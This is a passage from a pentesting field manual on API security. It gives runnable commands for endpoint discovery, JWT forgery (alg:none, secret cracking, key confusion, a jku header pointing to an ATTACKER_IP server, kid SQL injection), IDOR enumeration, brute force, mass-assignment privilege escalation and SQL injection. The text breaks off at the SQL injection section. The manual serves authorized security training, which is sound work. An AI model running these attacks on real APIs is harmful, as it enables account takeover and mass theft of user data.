# API Security Testing — Red Team Field Manual
### REST API | GraphQL | JWT | IDOR | Mass Assignment | Rate Limiting | gRPC | Full Methodology

> **Series Position:** Module 15
> Cross-references: `Web_Application_Security_RedTeam_Field_Manual.md` (authentication, injection, web fundamentals), `Mobile_Pentesting_Android_iOS_RedTeam_Field_Manual.md` (mobile apps hit the same APIs), `OSINT_Reconnaissance_RedTeam_Field_Manual.md` (finding API endpoints via OSINT).
>
> **Red Team Lens:** APIs are the backbone of every modern application — and they're consistently the most under-tested attack surface. Web app penetration testers focus on the browser. Mobile testers focus on the app. Nobody focuses on the API they both call. APIs frequently skip authentication checks, expose internal data, accept unexpected fields, and lack rate limiting. A single broken IDOR in an API often gives access to every user's data in the entire database.
>
> **Lab Disclaimer:** Test only APIs you are explicitly authorized to test. Broken object-level authorization in production can expose real user data — accessing it without authorization is a crime regardless of how easily it was accessed.

---

## Table of Contents

### PART 1 — API SECURITY FUNDAMENTALS
1. [API Attack Surface — What Makes APIs Different](#1-api-attack-surface)
2. [API Types & Protocols — REST, GraphQL, gRPC, SOAP](#2-api-types--protocols)
3. [Setting Up Your API Testing Environment](#3-api-testing-environment)
4. [API Discovery — Finding Endpoints](#4-api-discovery--finding-endpoints)

### PART 2 — AUTHENTICATION & AUTHORIZATION
5. [API Authentication Mechanisms — Full Map](#5-api-authentication-mechanisms)
6. [JWT — Deep Attack Reference](#6-jwt--deep-attack-reference)
7. [API Key Attacks](#7-api-key-attacks)
8. [OAuth 2.0 Vulnerabilities](#8-oauth-20-vulnerabilities)

### PART 3 — AUTHORIZATION VULNERABILITIES (OWASP API TOP RISKS)
9. [BOLA / IDOR — Broken Object-Level Authorization](#9-bola--idor--broken-object-level-authorization)
10. [BFLA — Broken Function-Level Authorization](#10-bfla--broken-function-level-authorization)
11. [Broken Object Property Level Authorization](#11-broken-object-property-level-authorization)
12. [Mass Assignment — Auto-Binding Attacks](#12-mass-assignment--auto-binding-attacks)
13. [Excessive Data Exposure](#13-excessive-data-exposure)

### PART 4 — INJECTION & INPUT ATTACKS
14. [Injection in APIs — SQL, NoSQL, Command](#14-injection-in-apis)
15. [Server-Side Request Forgery (SSRF) via API](#15-server-side-request-forgery-via-api)
16. [XXE in API Requests](#16-xxe-in-api-requests)

### PART 5 — RATE LIMITING & BUSINESS LOGIC
17. [Rate Limiting — Bypass Techniques](#17-rate-limiting--bypass-techniques)
18. [Business Logic Vulnerabilities in APIs](#18-business-logic-vulnerabilities-in-apis)
19. [Race Conditions in APIs](#19-race-conditions-in-apis)

### PART 6 — GRAPHQL SECURITY
20. [GraphQL — Architecture & Attack Surface](#20-graphql--architecture--attack-surface)
21. [GraphQL Introspection & Schema Extraction](#21-graphql-introspection--schema-extraction)
22. [GraphQL Injection & Query Abuse](#22-graphql-injection--query-abuse)
23. [GraphQL Authorization Bypass](#23-graphql-authorization-bypass)
24. [GraphQL Denial of Service](#24-graphql-denial-of-service)

### PART 7 — REST API METHODOLOGY
25. [Burp Suite for API Testing — Configuration](#25-burp-suite-for-api-testing)
26. [API Fuzzing — ffuf, wfuzz for APIs](#26-api-fuzzing--ffuf-wfuzz-for-apis)
27. [Postman & REST Client Testing](#27-postman--rest-client-testing)
28. [Automated API Scanning — OWASP ZAP & Nuclei](#28-automated-api-scanning--owasp-zap--nuclei)

### PART 8 — gRPC SECURITY
29. [gRPC — Protocol & Attack Surface](#29-grpc--protocol--attack-surface)
30. [gRPC Enumeration & Testing](#30-grpc-enumeration--testing)

### PART 9 — API VERSIONING & SHADOW APIS
31. [API Versioning Attacks — Finding Old Endpoints](#31-api-versioning-attacks)
32. [Shadow & Undocumented APIs](#32-shadow--undocumented-apis)

### PART 10 — FULL METHODOLOGY
33. [Complete API Pentest Methodology](#33-complete-api-pentest-methodology)
34. [API Pentest Checklist](#34-api-pentest-checklist)
35. [Full Chain: API Pentest Lab](#35-full-chain-api-pentest-lab)

---

# PART 1 — API SECURITY FUNDAMENTALS

---

## 1. API Attack Surface

### Layman's Terms
An API (Application Programming Interface) is how applications talk to each other — your mobile app asks a web server "give me user profile 123" and the server responds with JSON data. The critical difference from traditional web apps: **no HTML, no JavaScript, no browser rendering — just raw data exchange**. This means: no CSRF tokens (often), no cookie security attributes, no same-origin policy protection, and data returned is often far more granular than what's displayed on screen. The API frequently exposes fields the UI never shows.

### Real-World Events
**Peloton (2021)** — any unauthenticated user could query any other user's profile data including age, weight, location, and workout history by simply changing a user ID in the URL. No authentication required. Millions of profiles exposed. Classic BOLA.

**Experian (2021)** — credit score API exposed full credit data for anyone by submitting just name and address in a POST request. No authentication, no rate limiting. Any name + any address returned the associated credit file.

**T-Mobile (2023)** — API exposed complete account details including PINs, customer IDs, addresses for 37 million accounts. Discovered only when a threat actor had already extracted data for months.

```
WHY APIS ARE MORE VULNERABLE THAN WEB APPS:

Traditional Web App:
  Browser → HTML form → POST /login → Server sets cookie → Access
  Security: CSRF tokens, SameSite cookies, same-origin policy, visible UI

API:
  Client → Bearer token → GET /api/v1/user/1234 → JSON response
  Security: ONLY the bearer token (often)
  
  No CSRF tokens needed (no browser state)
  No same-origin policy (CORS configured by developer)
  No session timeout enforcement (JWT is valid until expiry)
  No UI filter (all data returned even if app doesn't display it)
  No WAF rules written for API patterns (WAF knows HTML, not JSON)
  
OWASP API SECURITY TOP 10 (2023):
  API1  Broken Object Level Authorization (BOLA/IDOR)
  API2  Broken Authentication
  API3  Broken Object Property Level Authorization  
  API4  Unrestricted Resource Consumption
  API5  Broken Function Level Authorization (BFLA)
  API6  Unrestricted Access to Sensitive Business Flows
  API7  Server Side Request Forgery
  API8  Security Misconfiguration
  API9  Improper Inventory Management (shadow APIs)
  API10 Unsafe Consumption of APIs

ATTACK SURFACE MAP:
  ├── Authentication endpoints (/login, /register, /token)
  ├── Object endpoints (/users/ID, /orders/ID, /docs/ID)
  ├── Function endpoints (/admin/*, /export, /bulk-*)
  ├── Search/filter endpoints (?filter=, ?sort=, ?include=)
  ├── Bulk operation endpoints (POST /bulk, DELETE /items)
  ├── File upload endpoints (/upload, /import)
  ├── Webhook endpoints (/webhook/*, /callback)
  └── Version endpoints (/api/v1/, /api/v2/, /v3/)
```

---

## 2. API Types & Protocols

```
REST (Representational State Transfer) — most common:
  Protocol: HTTP/HTTPS
  Format: JSON (mostly), XML, plain text
  Auth: Bearer tokens, API keys, OAuth
  Stateless: each request self-contained
  
  Endpoints: GET /users/123, POST /orders, DELETE /items/456
  Attack focus: IDOR, injection, auth bypass, mass assignment

GraphQL — increasingly common:
  Protocol: HTTP (single endpoint: /graphql)
  Format: JSON with custom query language
  Auth: Same as REST (tokens in headers)
  Powerful: client specifies exact data shape in query
  
  Attack focus: introspection, query complexity DoS, injection,
               batching attacks, auth bypass via field selection

gRPC — microservices:
  Protocol: HTTP/2 (binary, Protocol Buffers)
  Format: Protobuf (binary, not human-readable)
  Auth: TLS + tokens
  Harder to test: requires special tools
  
  Attack focus: reflection attacks, injection in string fields,
               auth bypass, insecure deserialization

SOAP — legacy (still found in enterprise):
  Protocol: HTTP, SMTP, others
  Format: XML with strict schema
  Auth: WS-Security, HTTP auth
  
  Attack focus: XXE, XML injection, WSDL exposure, replay attacks

WebSocket — real-time:
  Protocol: ws:// or wss://
  Format: Any (usually JSON)
  Persistent: connection stays open
  
  Attack focus: No CSRF protection, injection in messages,
               auth not re-checked after handshake
```

---

## 3. API Testing Environment

```bash
# ── ESSENTIAL TOOLS ────────────────────────────────────────────────
# Burp Suite Pro/Community (proxy + scanner):
# Download: https://portswigger.net/burp

# Postman (API client, documentation runner):
# Download: https://www.postman.com/downloads/

# httpx (fast HTTP toolkit):
go install -v github.com/projectdiscovery/httpx/cmd/httpx@latest

# ffuf (fast web fuzzer):
go install github.com/ffuf/ffuf/v2@latest

# arjun (HTTP parameter discovery):
pip3 install arjun

# jwt_tool (JWT testing):
git clone https://github.com/ticarpi/jwt_tool
pip3 install -r jwt_tool/requirements.txt

# graphql-cop (GraphQL security testing):
pip3 install graphql-cop

# clairvoyance (GraphQL schema extraction when introspection disabled):
pip3 install clairvoyance

# grpcurl (gRPC client):
go install github.com/fullstorydev/grpcurl/cmd/grpcurl@latest

# nuclei (vulnerability scanner with API templates):
go install -v github.com/projectdiscovery/nuclei/v3/cmd/nuclei@latest
nuclei -update-templates

# ── TARGET PRACTICE APIS ───────────────────────────────────────────
# Install deliberately vulnerable APIs for practice:

# DVWS (Damn Vulnerable Web Services):
docker run -d -p 80:80 snoopysecurity/dvws-node

# Juice Shop (OWASP, has API vulnerabilities):
docker run -d -p 3000:3000 bkimminich/juice-shop

# VAmPI (Vulnerable API):
git clone https://github.com/erev0s/VAmPI
cd VAmPI && pip3 install -r requirements.txt && python3 app.py

# crAPI (completely ridiculous API):
git clone https://github.com/OWASP/crAPI
cd crAPI && docker-compose up -d
# Specifically designed for API vulnerability practice

# ── BURP SUITE API CONFIGURATION ──────────────────────────────────
# Configure Burp for API testing:
# 1. Proxy → Options → Add listener 0.0.0.0:8080
# 2. Target → Scope → Add https://api.target.com
# 3. Proxy → HTTP History → Filter: show only in-scope
# 4. Extender → Install: Logger++, Param Miner, JSON Web Tokens
```

---

## 4. API Discovery — Finding Endpoints

```bash
# ══════════════════════════════════════════════════════════════════
# FIND ALL API ENDPOINTS BEFORE TESTING
# ══════════════════════════════════════════════════════════════════

# ── FROM JAVASCRIPT SOURCE ────────────────────────────────────────
# Most SPAs have API endpoints in their JavaScript bundle
# Method 1: Browser DevTools
# Open app → F12 → Network → Filter XHR/Fetch → see all API calls

# Method 2: Extract from JS files:
# Get all JS file URLs:
curl -s https://target.com | grep -oP 'src="[^"]+\.js"' | cut -d'"' -f2
# Download and search each JS file:
curl -s https://target.com/static/app.bundle.js | \
  grep -oP '(?<=["'\''`])/(api|v[0-9]+)/[a-zA-Z0-9/_-]+(?=["'\''`])' | sort -u

# Better: linkfinder
python3 LinkFinder.py -i https://target.com -d -o results.html
# -d = also follow linked JS files
# Expected: extracts all API endpoints from JS source

# ── FROM API DOCUMENTATION ────────────────────────────────────────
# Check common documentation paths:
for path in /api/docs /api/swagger /swagger.json /swagger.yaml \
           /openapi.json /openapi.yaml /api-docs /docs \
           /api/v1/docs /v1/swagger /api/schema \
           /redoc /graphql; do
  code=$(curl -s -o /dev/null -w "%{http_code}" "https://target.com$path")
  [ "$code" != "404" ] && echo "[$code] https://target.com$path"
done
# Expected findings:
# [200] https://target.com/swagger.json   ← Complete API documentation!
# [200] https://target.com/api/docs       ← Swagger UI
# [200] https://target.com/graphql        ← GraphQL endpoint!

# If swagger.json found — extract ALL endpoints:
curl -s https://target.com/swagger.json | python3 << 'EOF'
import json, sys

swagger = json.load(sys.stdin)
base_path = swagger.get('basePath', '')
paths = swagger.get('paths', {})

print(f"API Base: {swagger.get('host','')}{base_path}")
print(f"Total endpoints: {len(paths)}")
print()

for path, methods in paths.items():
    for method in methods:
        if method in ['get','post','put','patch','delete','head']:
            op = methods[method]
            params = [p['name'] for p in op.get('parameters',[])]
            print(f"{method.upper():6} {base_path}{path}")
            if params:
                print(f"       Params: {', '.join(params)}")
EOF

# ── ENDPOINT BRUTE FORCE ──────────────────────────────────────────
# Wordlists for API paths:
ls /usr/share/seclists/Discovery/Web-Content/
# api.txt, swagger.txt, openapi-wordlist.txt, raft-medium-words.txt

# Brute force API paths:
ffuf -u https://target.com/api/FUZZ \
  -w /usr/share/seclists/Discovery/Web-Content/api.txt \
  -mc 200,201,204,301,302,401,403 \
  -t 50 \
  -o api_endpoints.json

# With authentication:
ffuf -u https://target.com/api/v1/FUZZ \
  -w /usr/share/seclists/Discovery/Web-Content/raft-medium-words.txt \
  -H "Authorization: Bearer YOUR_JWT_TOKEN" \
  -mc 200,201,204,301,401,403 \
  -fc 404

# ── API VERSION DISCOVERY ─────────────────────────────────────────
# APIs often have multiple versions — old ones may lack security fixes
for v in v1 v2 v3 v4 v5 v6 v7 v8 v9 v10 1 2 3 "1.0" "2.0" "3.0" beta alpha; do
  code=$(curl -s -o /dev/null -w "%{http_code}" "https://target.com/api/$v/users")
  [ "$code" != "404" ] && echo "[$code] /api/$v/users"
done
# Expected:
# [200] /api/v1/users  ← Current version
# [200] /api/v2/users  ← Newer version
# [200] /api/v3/users  ← Latest

# ── PARAMETER DISCOVERY ──────────────────────────────────────────
# Find hidden parameters in API endpoints:
arjun -u "https://target.com/api/v1/users" \
  -m GET \
  -H "Authorization: Bearer TOKEN" \
  -oJ params.json

# Expected:
# [+] Parameter found: include
# [+] Parameter found: expand
# [+] Parameter found: fields
# [+] Parameter found: debug    ← Debug parameter!

# Try found parameters:
curl "https://target.com/api/v1/users?debug=true" \
  -H "Authorization: Bearer TOKEN"
# Expected if vulnerable: stack trace, internal info, extra fields returned
```

---

# PART 2 — AUTHENTICATION & AUTHORIZATION

---

## 5. API Authentication Mechanisms — Full Map

```bash
# ── BEARER TOKEN (MOST COMMON) ─────────────────────────────────────
# Authorization: Bearer eyJhbGciOiJIUzI1NiJ9...
# Test: remove header → should get 401
# Test: use another user's token → should get 401

curl "https://target.com/api/v1/profile" \
  -H "Authorization: Bearer STOLEN_TOKEN"
# If 200: token stolen from another user works (check BOLA/IDOR)

# ── API KEY ─────────────────────────────────────────────────────────
# X-API-Key: abc123def456
# ?api_key=abc123def456
# Authorization: ApiKey abc123def456

# Test: API key in header vs URL vs body (different paths = different auth checks?)
# Test: Brute force if short API key

# ── BASIC AUTH ────────────────────────────────────────────────────
# Authorization: Basic base64(username:password)
# Brute force:
hydra -L users.txt -P rockyou.txt \
  https-get://api.target.com:443/api/v1/admin \
  -f -V

# ── NO AUTHENTICATION ─────────────────────────────────────────────
# Test every endpoint without any auth header:
# Some developers forget to add auth middleware to specific routes!
curl "https://target.com/api/v1/users"           # Without auth
curl "https://target.com/api/v1/admin/users"      # Admin route without auth?
curl "https://target.com/api/v1/internal/config"  # Internal route?

# ── AUTHENTICATION BYPASS TECHNIQUES ─────────────────────────────
# 1. Change HTTP method:
curl -X GET "https://target.com/api/v1/admin"     # Returns 401
curl -X POST "https://target.com/api/v1/admin"    # Returns 200?! Method not checked

# 2. Add content type:
curl "https://target.com/api/v1/admin" \
  -H "Content-Type: application/json"
# Some auth middleware skips check if content-type is set

# 3. Path variations:
# /api/v1/users vs /api/v1/Users vs /API/V1/USERS
# Some auth middleware is case-sensitive

# 4. HTTP/1.1 vs HTTP/2:
curl --http2 "https://target.com/api/v1/admin" -H "Authorization: Bearer TOKEN"
# Some middleware only applies to HTTP/1.1

# 5. Add .json, .xml, .csv extension:
curl "https://target.com/api/v1/admin.json"
curl "https://target.com/api/v1/admin%2Ejson"  # URL-encoded dot
```

---

## 6. JWT — Deep Attack Reference

### Layman's Terms
JWT (JSON Web Token) is the most common API authentication mechanism. A JWT is a **self-contained token** with three base64-encoded parts: header (algorithm), payload (user data + claims), and signature (HMAC or RSA). The server trusts the payload **because of the signature** — if you can forge or invalidate the signature check, you control your own claims and can become any user.

```bash
# ── JWT STRUCTURE ─────────────────────────────────────────────────
# JWT = base64(header) . base64(payload) . signature
# Example:
TOKEN="eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyX2lkIjoxMjM0LCJyb2xlIjoidXNlciIsImV4cCI6MTcwNTM3OTI0MH0.SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c"

# Decode header:
echo "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9" | base64 -d 2>/dev/null
# {"alg":"HS256","typ":"JWT"}

# Decode payload:
echo "eyJ1c2VyX2lkIjoxMjM0LCJyb2xlIjoidXNlciIsImV4cCI6MTcwNTM3OTI0MH0" | base64 -d 2>/dev/null
# {"user_id":1234,"role":"user","exp":1705379240}

# ── jwt_tool SETUP ────────────────────────────────────────────────
python3 jwt_tool.py TOKEN -v
# Expected:
# Token header values:
# [+] alg = "HS256"
# [+] typ = "JWT"
# Token payload values:
# [+] user_id = 1234
# [+] role = "user"
# [+] exp = 1705379240 (2024-01-16 03:14:00)

# ── ATTACK 1: ALG:NONE ────────────────────────────────────────────
# Some servers accept unsigned tokens with alg:none!
python3 jwt_tool.py TOKEN -X a
# Creates: eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.PAYLOAD.
# (empty signature!)

# Test manually:
# Modify payload to role:admin, remove signature
HEADER=$(echo -n '{"alg":"none","typ":"JWT"}' | base64 -w0 | tr -d '=')
PAYLOAD=$(echo -n '{"user_id":1234,"role":"admin","exp":9999999999}' | base64 -w0 | tr -d '=')
NONE_JWT="${HEADER}.${PAYLOAD}."
echo "Testing alg:none JWT:"
curl "https://target.com/api/v1/admin" \
  -H "Authorization: Bearer $NONE_JWT"
# Expected if vulnerable: 200 with admin data!

# Variations of alg:none (some servers check case):
python3 jwt_tool.py TOKEN -X a  # none
# Also try: NONE, None, nOnE, NoNe

# ── ATTACK 2: HS256 WEAK SECRET ────────────────────────────────────
# If algorithm is HS256, secret may be weak or hardcoded
# Crack with hashcat mode 16500:
echo "TOKEN" > jwt.txt
hashcat -a 0 -m 16500 jwt.txt /usr/share/wordlists/rockyou.txt
# Expected if cracked:
# eyJhbGci...:secretpassword123

# Common JWT secrets to try:
# secret, password, 12345, jwt_secret, your-256-bit-secret
# company_name, production_secret, dev_secret

# If secret found — forge any token:
python3 jwt_tool.py TOKEN -T -S hs256 -p "found_secret"
# -T = tamper mode (opens editor to modify payload)
# -S hs256 = sign with HS256
# -p = secret

# ── ATTACK 3: RS256 → HS256 CONFUSION ────────────────────────────
# Server uses RS256 (asymmetric, private key signs, public key verifies)
# Attack: change alg to HS256, sign with the PUBLIC KEY
# Server verifies HS256 using the same key it uses to verify RS256 signatures
# = the public key, which we know!

# Get public key from JWKS endpoint:
curl "https://target.com/.well-known/jwks.json"
# Expected:
# {"keys":[{"kty":"RSA","use":"sig","n":"xyz...","e":"AQAB","kid":"key1"}]}

# Convert JWK to PEM:
python3 jwt_tool.py TOKEN -V -jw jwks.json
# Extracts public key to pubkey.pem

# Exploit RS256→HS256 confusion:
python3 jwt_tool.py TOKEN -X k -pk pubkey.pem
# Signs tampered token using PUBLIC KEY as HS256 secret
# Server verifies it as HS256 using the same public key!

# ── ATTACK 4: JWKS INJECTION ──────────────────────────────────────
# Some servers allow specifying the JWKS URL in the JWT header!
# "jku" or "x5u" header parameter points to key URL
# We point it to our own server with our own key!

# Step 1: Generate RSA key pair:
openssl genrsa -out attacker_priv.pem 2048
openssl rsa -in attacker_priv.pem -pubout -out attacker_pub.pem

# Step 2: Create JWKS file with our public key and serve it:
python3 jwt_tool.py TOKEN --jwks-key attacker_priv.pem
# Generates jwks.json → serve via: python3 -m http.server 8080

# Step 3: Create JWT with jku pointing to our server:
python3 jwt_tool.py TOKEN -X j \
  -ju "http://ATTACKER_IP:8080/jwks.json" \
  -pk attacker_priv.pem
# JWT now points to our JWKS, signed with our private key
# Server fetches our JWKS, uses our public key to verify → trusts it!

# ── ATTACK 5: KID HEADER INJECTION ─────────────────────────────────
# "kid" (key ID) header parameter selects which key to use
# Some servers pass kid directly to file read or database query → injection!

# SQL injection in kid:
python3 jwt_tool.py TOKEN -I -hc kid -hv "' UNION SELECT 'secret'--"
# If server queries DB: SELECT key FROM keys WHERE kid='...'
# Our payload forces: key = 'secret'
# Then sign with 'secret' as HS256 key!

# Path traversal in kid:
python3 jwt_tool.py TOKEN -I -hc kid -hv "../../dev/null"
# Empty file as signing key → sign with empty string ""
python3 jwt_tool.py TOKEN -X n  # Sign with null/empty key

# ── ATTACK 6: EXPIRED TOKEN ────────────────────────────────────────
# Check if server validates expiry (exp claim):
python3 jwt_tool.py TOKEN -T    # Tamper: change exp to past date
# If server accepts expired token → no expiry validation!

# ── ATTACK 7: NO SIGNATURE VALIDATION ────────────────────────────
# Test: modify payload without changing signature:
python3 jwt_tool.py TOKEN -T    # Change role to "admin"
# DON'T re-sign — send with original signature
# If server accepts: NO signature validation at all!

# ── JWT_TOOL FULL SCAN ────────────────────────────────────────────
python3 jwt_tool.py TOKEN -M pb \
  -rh "Authorization" \
  -rc "Bearer" \
  -t "https://target.com/api/v1/admin"
# -M pb = playbook mode (runs all attack scenarios automatically)
# Tests: none alg, weak secrets, RS256→HS256, kid injection, etc.
```

---

# PART 3 — AUTHORIZATION VULNERABILITIES

---

## 9. BOLA / IDOR — Broken Object-Level Authorization

### Layman's Terms
**The #1 API vulnerability**. When an API uses an object ID in the URL (like `/api/users/1234`), it should verify you're authorized to access that object. BOLA means it doesn't — change `1234` to `1235` and you get someone else's data. At scale, this is catastrophic: enumerate IDs 1 through 10,000,000 and you dump the entire database.

### Real-World: T-Mobile API — 37 Million Users

```bash
# ── BASIC IDOR TEST ───────────────────────────────────────────────
# You're authenticated as user 1234
# Test accessing user 1235:
curl "https://target.com/api/v1/users/1235" \
  -H "Authorization: Bearer YOUR_TOKEN"
# Expected if VULNERABLE: another user's complete profile!
# Expected if SECURE: 403 Forbidden or 404 Not Found

# ── ID ENUMERATION TECHNIQUES ─────────────────────────────────────
# Numeric IDs (sequential):
for id in $(seq 1 100); do
  code=$(curl -s -o /dev/null -w "%{http_code}" \
    "https://target.com/api/v1/users/$id" \
    -H "Authorization: Bearer YOUR_TOKEN")
  [ "$code" = "200" ] && echo "Found user ID: $id"
done

# With ffuf (faster):
ffuf -u "https://target.com/api/v1/users/FUZZ" \
  -w <(seq 1 10000) \
  -H "Authorization: Bearer YOUR_TOKEN" \
  -mc 200 \
  -t 50 \
  -o idor_results.json

# ── UUID/GUID IDORs ────────────────────────────────────────────────
# UUIDs look like: 550e8400-e29b-41d4-a716-446655440000
# NOT sequential — can't enumerate by guessing
# But: check API response for other UUIDs in related objects!

# Find UUIDs in API responses:
curl "https://target.com/api/v1/orders/MY_ORDER_ID" \
  -H "Authorization: Bearer TOKEN" | python3 -m json.tool
# Expected response:
# {
#   "id": "550e8400-...",
#   "user_id": "another-uuid-here",     ← UUID of another user!
#   "created_by": "admin-uuid-here"     ← Admin UUID!
# }
# Now test: GET /api/v1/users/admin-uuid-here

# ── IDOR IN DIFFERENT REQUEST PARTS ────────────────────────────────
# Test IDOR in:
# 1. URL path: /api/users/VICTIM_ID
# 2. Query parameter: /api/orders?user_id=VICTIM_ID
# 3. Request body: {"user_id": VICTIM_ID}
# 4. HTTP header: X-User-Id: VICTIM_ID
# 5. Cookie value: userId=VICTIM_ID

# Test all variations:
curl "https://target.com/api/v1/profile" \
  -H "Authorization: Bearer TOKEN" \
  -H "X-User-Id: 9999"

curl "https://target.com/api/v1/profile?user_id=9999" \
  -H "Authorization: Bearer TOKEN"

# ── IDOR IN NESTED OBJECTS ────────────────────────────────────────
# Some APIs have nested authorization:
# /api/users/123/orders/456 (user 123 owns order 456)
# Test: can user 123 access order from user 789?
curl "https://target.com/api/v1/users/123/orders/789_ORDER_FROM_DIFF_USER" \
  -H "Authorization: Bearer USER_123_TOKEN"
# If 200: IDOR on nested resource!

# ── HORIZONTAL vs VERTICAL PRIVILEGE ESCALATION ────────────────────
# Horizontal IDOR: access OTHER USER's same-privilege data
#   /api/users/1235 while you're user 1234
#   /api/orders/different_user_order
#
# Vertical IDOR: access higher-privilege resource
#   /api/admin/users while you're a regular user
#   /api/v1/users?role=admin while you're a regular user

# ── IDOR WITH PARAMETER POLLUTION ────────────────────────────────
# Try sending parameter twice:
curl "https://target.com/api/v1/orders?user_id=MY_ID&user_id=VICTIM_ID" \
  -H "Authorization: Bearer TOKEN"
# Some APIs take the first, some take the last — test both

# ── AUTOMATED IDOR TESTING WITH FFUF ─────────────────────────────
# Two-user test: authenticate as user A, enumerate user B's resources
# Get User A token and User B token

# Test endpoint with User A's token against User B's object IDs:
ffuf -u "https://target.com/api/v1/users/FUZZ/profile" \
  -w userids.txt \
  -H "Authorization: Bearer USER_A_TOKEN" \
  -mc 200 \
  -fr "\"user_id\":\"USER_A_ID\""  # Filter out your own results
# Any 200 that doesn't contain USER_A_ID = IDOR!
```

---

## 10. BFLA — Broken Function-Level Authorization

```bash
# BFLA: accessing functionality you shouldn't have access to
# Different from BOLA (which accesses data) — BFLA performs ACTIONS

# ── FIND ADMIN ENDPOINTS ──────────────────────────────────────────
# Admin functionality often on different URL patterns:
# /api/admin/*
# /api/v1/admin/*
# /api/management/*
# /internal/*
# /api/v1/users (DELETE method — regular user shouldn't delete)

# Test common admin endpoints with regular user token:
for path in /api/admin /api/v1/admin /api/management /api/internal \
            /api/v1/users/bulk-delete /api/v1/export /api/v1/analytics; do
  code=$(curl -s -o /dev/null -w "%{http_code}" \
    "https://target.com$path" \
    -H "Authorization: Bearer REGULAR_USER_TOKEN")
  echo "[$code] $path"
done
# [403] /api/admin    ← correctly blocked
# [200] /api/v1/export  ← not blocked! Regular user can export ALL data!

# ── METHOD-BASED AUTHORIZATION BYPASS ────────────────────────────
# API may check auth for GET but not PUT/DELETE:
# GET /api/v1/users/123 → checked
# DELETE /api/v1/users/123 → NOT checked?

curl -X DELETE "https://target.com/api/v1/users/999" \
  -H "Authorization: Bearer REGULAR_USER_TOKEN"
# If 200 or 204: BFLA — regular user can delete any user!

# ── ROLE PARAMETER INJECTION ─────────────────────────────────────
# Some APIs pass role in request:
curl -X POST "https://target.com/api/v1/register" \
  -H "Content-Type: application/json" \
  -d '{"username":"test","password":"Pass123","email":"test@test.com","role":"admin"}'
# If account created with admin role: BFLA via mass assignment!

# ── HTTP VERB TAMPERING ───────────────────────────────────────────
# Auth check may only apply to POST:
curl -X PUT "https://target.com/api/v1/users/999/role" \
  -H "Authorization: Bearer REGULAR_TOKEN" \
  -d '{"role":"admin"}'
# GET method checked? PUT/PATCH checked? Test all verbs.
```

---

## 12. Mass Assignment — Auto-Binding Attacks

### Layman's Terms
Mass assignment is when a framework **automatically maps request parameters to object properties**. If you POST `{"username":"alice","email":"alice@co.com","role":"admin"}` and the server blindly maps ALL fields to the user object including `role`, you've escalated your own privileges. This is the same bug that caused the **GitHub mass assignment attack (2012)** where a developer added an SSH key to any repo by exploiting Rails' mass assignment.

```bash
# ── FIND VULNERABLE ENDPOINTS ─────────────────────────────────────
# Registration, profile update, order creation = classic targets

# ── ATTACK 1: PRIVILEGE ESCALATION VIA REGISTRATION ────────────────
curl -X POST "https://target.com/api/v1/register" \
  -H "Content-Type: application/json" \
  -d '{
    "username": "attacker",
    "password": "Password123!",
    "email": "attacker@evil.com",
    "role": "admin",
    "is_admin": true,
    "isAdmin": true,
    "admin": true,
    "user_type": "administrator",
    "permissions": ["read","write","admin"],
    "subscription": "premium"
  }'
# Try ALL potential privilege fields
# Check response and subsequent API calls to see if any took effect

# ── ATTACK 2: PRICE/AMOUNT MANIPULATION ───────────────────────────
# E-commerce APIs — send negative quantities, zero prices:
curl -X POST "https://target.com/api/v1/orders" \
  -H "Authorization: Bearer TOKEN" \
  -H "Content-Type: application/json" \
  -d '{
    "product_id": 123,
    "quantity": 1,
    "price": 0.01,
    "discount": 100,
    "total": 0
  }'
# If server uses client-supplied price: order placed for $0.01!

# ── ATTACK 3: PROFILE UPDATE WITH EXTRA FIELDS ────────────────────
# What fields does the User object have that aren't in the UI?
# Check API response for ALL fields:
curl "https://target.com/api/v1/profile" \
  -H "Authorization: Bearer TOKEN" | python3 -m json.tool
# Expected response showing ALL fields:
# {
#   "id": 1234,
#   "username": "alice",
#   "email": "alice@target.com",
#   "role": "user",              ← Try to overwrite this!
#   "credit_balance": 0,         ← Try to set to 9999!
#   "verified": false,           ← Try to set to true!
#   "created_at": "2024-01-01"
# }

# Now PUT/PATCH with extra fields:
curl -X PUT "https://target.com/api/v1/profile" \
  -H "Authorization: Bearer TOKEN" \
  -H "Content-Type: application/json" \
  -d '{
    "email": "alice@target.com",
    "role": "admin",
    "credit_balance": 99999,
    "verified": true
  }'
# Check profile after: did any of these stick?

# ── FIND HIDDEN PROPERTIES ────────────────────────────────────────
# Use Param Miner (Burp extension) to find hidden parameters
# Or manually: look at other API responses for fields not in update endpoint
# Also: check API documentation for full object schema
```

---

## 13. Excessive Data Exposure

```bash
# API returns more data than the app displays
# The UI filters display, but ALL data is in the response

# ── TEST EVERY API RESPONSE FOR EXCESS DATA ────────────────────────
curl "https://target.com/api/v1/users/search?q=alice" \
  -H "Authorization: Bearer TOKEN" | python3 -m json.tool
# Expected VULNERABLE response:
# {
#   "results": [{
#     "id": 1234,
#     "username": "alice",
#     "email": "alice@target.com",
#     "phone": "+1-555-0100",          ← UI shows username only!
#     "password_hash": "$2b$10$...",   ← NEVER should be in response!
#     "social_security": "123-45-6789",← CRITICAL PII!
#     "credit_card_last4": "4242",
#     "internal_notes": "VIP customer, avoid upsell",
#     "api_key": "sk-live-abcdef123456" ← SECRET KEY IN RESPONSE!
#   }]
# }

# Common fields to look for in responses:
# password, password_hash, salt, token, secret, api_key, private_key
# ssn, social_security, dob, date_of_birth
# credit_card, card_number, cvv
# internal_notes, admin_notes, flags
# reset_token, verification_token, activation_code
# AWS_SECRET, stripe_key, twilio_token

# ── AGGREGATE RESPONSE TESTING ────────────────────────────────────
# Endpoint designed for list = often returns full objects:
curl "https://target.com/api/v1/users?limit=100" \
  -H "Authorization: Bearer TOKEN"
# Should return limited fields for list view
# But often returns full objects with all sensitive fields

# ── FILTER BYPASS ─────────────────────────────────────────────────
# API may have field filtering: ?fields=username,email
# Try requesting hidden fields explicitly:
curl "https://target.com/api/v1/users/123?fields=username,email,password_hash,api_key" \
  -H "Authorization: Bearer TOKEN"
# If additional fields returned: filter bypass!
```

---

# PART 4 — INJECTION & INPUT ATTACKS

---

## 14. Injection in APIs

```bash
# ── SQL INJECTION IN API PARAMETERS ──────────────────────────────
# APIs often pass query parameters directly to SQL:

# GET parameter injection:
curl "https://target.com/api/v1/users?id=1 OR 1=1--" \
